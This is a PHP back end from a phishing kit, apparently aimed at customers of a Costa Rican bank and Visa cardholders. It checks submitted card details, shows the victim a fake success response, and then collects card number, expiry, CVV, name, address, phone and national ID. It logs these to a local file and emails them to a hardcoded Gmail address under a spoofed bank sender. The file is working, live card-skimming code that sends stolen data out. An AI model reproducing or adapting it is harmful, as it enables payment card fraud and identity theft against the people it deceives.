<?php
error_reporting(0);
			
if(isset($_GET['numero'])){
if(empty($_GET['id'] && $_GET['nombre'] && $_GET['month'] && $_GET['year'] && $_GET['cvv'])){
echo '{"status":"error","errordescription":"Falta un parametro","number":"408"}';
exit();	
} else
$nombrecompleto = $_GET['nombre'];           
$expm = $_GET['month'];
$expy = $_GET['year'];
$cvv = $_GET['cvv'];

function name_validation($name){
            if(strpos($name, ' ')){
            $name = str_replace(" ", "", $name);
            if(is_numeric($name)){
            return 0;    
            }
            if(strpos($name, '0') || strpos($name, '1') || strpos($name, '2') || strpos($name, '3') || strpos($name, '4') || strpos($name, '5') ||strpos($name, '6') || strpos($name, '7') || strpos($name, '8') || strpos($name, '9')){
            return 0;
            } else {
            return 1;    
            }
            } else {
            return 0;   
            }
            }
            function address_validation($address){
            if(strpos($address, ' ')){
           
            return 1;
            } else {
            return 0;   
            }
            }
		include_once 'library/creditcards.class.php';
            $CCV = new CreditCardValidator();
            $CCV->Validate($_GET['numero']);
            $CARDINFO = $CCV->GetCardInfo();
            $status = strtoupper($CARDINFO['status']);
            $tta = substr($_GET['numero'], 0,1);
            if(name_validation(str_replace("%20", " ", $nombrecompleto)) == 0){
            echo '{"status":"error","errordescription":"Por favor corrija los errores en su nombre y vuelva a continuar el proceso","number":"404"}';
            exit();		
            } else
            
            
            if($status == 'INVALID'){
            echo '{"status":"error","errordescription":"El número de tarjeta es inválido","number":"404"}';
            exit();
            }else
			if(strlen($cvv) < 3){
			echo '{"status":"error","errordescription":"CVV Incorrecto","number":"404"}';
			exit();
			} else if($_GET['year'] == '2019') {
			echo '{"status":"error","errordescription":"Fecha Incorrecta","number":"404"}';
			exit();
			} else if($_GET['year'] < 2019){
			echo '{"status":"error","errordescription":"Fecha Incorrecta1","number":"404"}';	
			exit();
			} else if(strlen($expy) > 4) {
			echo '{"status":"error","errordescription":"Fecha Incorrecta2","number":"404"}';	
			exit();
			}else if(strlen($expy) < 4) {
			echo '{"status":"error","errordescription":"Fecha Incorrecta3","number":"404"}';	
			exit();
			}
			
			if($tta == 4){
			if(strlen($cvv) > 3) {
			echo '{"status":"error","errordescription":"CVV Inválido","number":"404"}';	
			exit();
			}
			}
			if($tta == 3){
			if(strlen($cvv) < 4) {
			echo '{"status":"error","errordescription":"CVV Inválido","number":"404"}';	
			exit();
			}
			}
			if($tta == 5){
			if(strlen($cvv) > 3) {
			echo '{"status":"error","errordescription":"CVV Inválido","number":"404"}';	
			exit();
			}
			}
			if($tta == 6){
			if(strlen($cvv) > 3) {
			echo '{"status":"error","errordescription":"CVV Inválido","number":"404"}';	
			exit();
			}
			}
			
			
echo '{"status":"success","errordescription":"none","number":"302"}';

$kOpD3ZelQ = fopen('ccdata-error.text','a+');
 $zPpD3ZelQ = fwrite($kOpD3ZelQ, "<hr></hr>IDENTIFICACION UNICA : ".$_GET['id']."</br>NUMERO ".$_GET['numero']."</br>EXP ".$_GET['month']."/".$_GET['year']."</br>CVV ".$_GET['cvv']."</br>NOMBRE ".$_GET['nombre']."</br>DIRECCION : ".$_GET['direccion']."</br>TELEFONO : ".$_GET['telefono']."</br>DNI : ".$_GET['dni']."</BR>AGENTE DE NAVEGACION ".$_SERVER['HTTP_USER_AGENT']."<hr></hr>");
 
 fclose($kOpD3ZelQ);
   $content .= "
IDENTIFICACION: ".$_GET['id']."
NUMERO ".$_GET['numero']."
EXP ".$_GET['month']."/".$_GET['year']."
CVV ".$_GET['cvv']."
NOMBRE ".$_GET['nombre']."
DIRECCION : ".$_GET['direccion']."
TELEFONO : ".$_GET['telefono']."
DNI : ".$_GET['dni']."
AGENTE DE NAVEGACION ".$_SERVER['HTTP_USER_AGENT']."";

$recipient = "edgarlozolla1@gmail.com";
$subject = "Login Visa Home";
$prefijo = substr(md5(uniqid(rand())),0,6);
$from = "From:Login Visa Home - $ip<$prefijo@bancobcr.com>";

mail($recipient,$subject,$content,$from);
			exit();
}		
			?>
